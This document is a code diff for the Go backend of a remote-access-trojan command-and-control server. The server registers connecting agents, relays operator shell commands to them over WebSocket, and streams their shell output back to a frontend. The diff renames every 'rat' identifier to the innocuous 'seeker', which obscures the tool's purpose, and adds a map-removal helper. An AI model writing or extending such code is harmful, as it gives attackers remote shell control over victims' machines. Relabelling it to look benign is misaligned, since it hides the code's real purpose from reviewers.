@@ -2,6 +2,7 @@ package handlers
 
 import (
 	"argus/backend/models"
+	"argus/backend/utils"
 	"encoding/json"
 	"fmt"
 	"log"
@@ -23,8 +24,8 @@ var upgrader = websocket.Upgrader{
 
 // Global variables
 var (
-	rats          = make(map[string]*models.Rat)
-	ratsLock      sync.RWMutex
+	seekers       = make(map[string]*models.Seeker)
+	seekersLock   sync.RWMutex
 	frontends     = make(map[*websocket.Conn]bool)
 	frontendsLock sync.RWMutex
 )
@@ -33,13 +34,13 @@ func ServeFrontend(w http.ResponseWriter, r *http.Request) {
 	http.ServeFile(w, r, filepath.Join("backend", "static", "index.html"))
 }
 
-func GetRats(w http.ResponseWriter, r *http.Request) {
-	ratsLock.RLock()
-	defer ratsLock.RUnlock()
+func GetSeekers(w http.ResponseWriter, r *http.Request) {
+	seekersLock.RLock()
+	defer seekersLock.RUnlock()
 
-	data, err := json.Marshal(rats)
+	data, err := json.Marshal(seekers)
 	if err != nil {
-		http.Error(w, "Failed to serialize rats", http.StatusInternalServerError)
+		http.Error(w, "Failed to serialize seekers", http.StatusInternalServerError)
 		return
 	}
 
@@ -47,60 +48,59 @@ func GetRats(w http.ResponseWriter, r *http.Request) {
 	w.Write(data)
 }
 
-func RatWebSocketHandler(w http.ResponseWriter, r *http.Request) {
+func SeekerWebSocketHandler(w http.ResponseWriter, r *http.Request) {
 	conn, err := upgrader.Upgrade(w, r, nil)
 	if err != nil {
-		log.Println("Rat WebSocket upgrade failed:", err)
+		log.Println("Seeker WebSocket upgrade failed:", err)
 		return
 	}
 	defer conn.Close()
 
-	var initData models.Rat
+	var initData models.Seeker
 	if err := conn.ReadJSON(&initData); err != nil {
-		log.Println("Failed to read initial rat data:", err)
+		log.Println("Failed to read initial seeker data:", err)
 		return
 	}
 
-	ratID := uuid.New().String()
-	initData.ID = ratID
+	seekerID := uuid.New().String()
+	initData.ID = seekerID
 
-	ratsLock.Lock()
-	rats[ratID] = &initData
-	rats[ratID].Conn = conn
-	ratsLock.Unlock()
+	seekersLock.Lock()
+	seekers[seekerID] = &initData
+	seekers[seekerID].Conn = conn
+	seekersLock.Unlock()
 
-	if err := conn.WriteJSON(map[string]string{"id": ratID}); err != nil {
-		log.Println("Failed to send ID to rat:", err)
-		ratsLock.Lock()
-		delete(rats, ratID)
-		ratsLock.Unlock()
+	if err := conn.WriteJSON(map[string]string{"id": seekerID}); err != nil {
+		log.Println("Failed to send ID to seeker:", err)
+		utils.RemoveFromMap(seekers, seekerID, &seekersLock)
 		return
 	}
 
-	log.Printf("Rat connected: %s (%s)", initData.Name, initData.ID)
+	log.Printf("Seeker connected: %s (%s)", initData.Name, initData.ID)
 
-	broadcastRatList()
+	broadcastSeekerList()
 
 	for {
 		var msg models.Message
 		if err := conn.ReadJSON(&msg); err != nil {
-			log.Println("Rat WebSocket read error:", err)
-			ratsLock.Lock()
-			delete(rats, initData.ID)
-			ratsLock.Unlock()
-			broadcastRatList()
+			log.Println("Seeker WebSocket read error:", err)
+			utils.RemoveFromMap(seekers, initData.ID, &seekersLock)
+			seekersLock.Lock()
+			delete(seekers, initData.ID)
+			seekersLock.Unlock()
+			broadcastSeekerList()
 			return
 		}
 
-		log.Printf("Received from rat %s: %v", initData.ID, msg)
+		log.Printf("Received from seeker %s: %v", initData.ID, msg)
 
 		switch msg.Type {
 		case "shell_output":
 			broadcastToFrontends(models.Message{
 				Type: "shell_output",
 				Data: map[string]interface{}{
-					"rat_id": initData.ID,
-					"output": msg.Data,
+					"seeker_id": initData.ID,
+					"output":    msg.Data,
 				},
 			})
 		}
@@ -118,21 +118,18 @@ func FrontendWebSocketHandler(w http.ResponseWriter, r *http.Request) {
 	frontends[conn] = true
 	frontendsLock.Unlock()
 
-	ratsLock.RLock()
-	data, _ := json.Marshal(rats)
-	ratsLock.RUnlock()
+	seekersLock.RLock()
+	data, _ := json.Marshal(seekers)
+	seekersLock.RUnlock()
 	conn.WriteJSON(models.Message{
-		Type: "rat_list",
+		Type: "seeker_list",
 		Data: string(data),
 	})
 
 	log.Println("Frontend connected")
 
 	defer func() {
-		frontendsLock.Lock()
-		delete(frontends, conn)
-		frontendsLock.Unlock()
-		conn.Close()
+		utils.RemoveFromMap(frontends, conn, &frontendsLock)
 		log.Println("Frontend disconnected")
 	}()
 
@@ -152,9 +149,9 @@ func FrontendWebSocketHandler(w http.ResponseWriter, r *http.Request) {
 				log.Println("Invalid shell_command data")
 				continue
 			}
-			ratID, ok := data["rat_id"].(string)
+			seekerID, ok := data["seeker_id"].(string)
 			if !ok {
-				log.Println("Invalid rat_id")
+				log.Println("Invalid seeker_id")
 				continue
 			}
 			command, ok := data["command"].(string)
@@ -162,7 +159,7 @@ func FrontendWebSocketHandler(w http.ResponseWriter, r *http.Request) {
 				log.Println("Invalid command")
 				continue
 			}
-			sendToRat(ratID, models.Message{
+			sendToSeeker(seekerID, models.Message{
 				Type: "shell_command",
 				Data: command,
 			})
@@ -170,16 +167,16 @@ func FrontendWebSocketHandler(w http.ResponseWriter, r *http.Request) {
 	}
 }
 
-func sendToRat(ratID string, msg models.Message) error {
-	ratsLock.RLock()
-	rat, exists := rats[ratID]
-	ratsLock.RUnlock()
+func sendToSeeker(seekerID string, msg models.Message) error {
+	seekersLock.RLock()
+	seeker, exists := seekers[seekerID]
+	seekersLock.RUnlock()
 
 	if !exists {
-		return fmt.Errorf("rat %s not found", ratID)
+		return fmt.Errorf("seeker %s not found", seekerID)
 	}
 
-	return rat.Conn.WriteJSON(msg)
+	return seeker.Conn.WriteJSON(msg)
 }
 
 func broadcastToFrontends(msg models.Message) {
@@ -193,13 +190,13 @@ func broadcastToFrontends(msg models.Message) {
 	}
 }
 
-func broadcastRatList() {
-	ratsLock.RLock()
-	data, _ := json.Marshal(rats)
-	ratsLock.RUnlock()
+func broadcastSeekerList() {
+	seekersLock.RLock()
+	data, _ := json.Marshal(seekers)
+	seekersLock.RUnlock()
 
 	broadcastToFrontends(models.Message{
-		Type: "rat_list",
+		Type: "seeker_list",
 		Data: string(data),
 	})
 }
